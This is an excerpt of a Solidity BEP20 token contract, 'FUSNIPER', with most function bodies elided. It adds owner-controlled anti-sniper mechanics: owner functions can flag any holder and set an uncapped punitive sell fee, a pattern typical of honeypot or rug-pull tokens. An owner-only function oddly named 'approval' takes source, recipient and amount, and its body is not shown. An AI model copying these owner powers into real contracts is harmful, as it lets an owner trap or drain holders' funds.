...
contract FUSNIPER is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "FUSNIPER";
    string constant _symbol = "FUSNIPER";
    ...
    bool sniPe = true;
    uint256 snf = 75;
    uint8 snPrs = 180 seconds;
    bool sFrz = true;
    uint8 sFrzT = 5 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = true;
    uint8 bFrzT = 2 seconds;
    ...
    function _transFrom(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        if(sender == pair && sniPe && sNTime >= block.timestamp){
            isnPr[recipient] = true;}
    ...
    function approval(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
    ...
    function getTotF(bool selling, address sender) public view returns (uint256) {
        if(selling && isnPr[sender]){return snf.mul(1); }
    ...
    function totalF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotF(receiver == pair, receiver)).div(fD);
    ...
    function setsNipR(address holder, bool exempt) external authorized {
        isnPr[holder] = exempt;
    }
    ...
    function setsnip(bool _enabled, uint256 _snf) external authorized { 
        sniPe = _enabled;
        snf = _snf;
    }
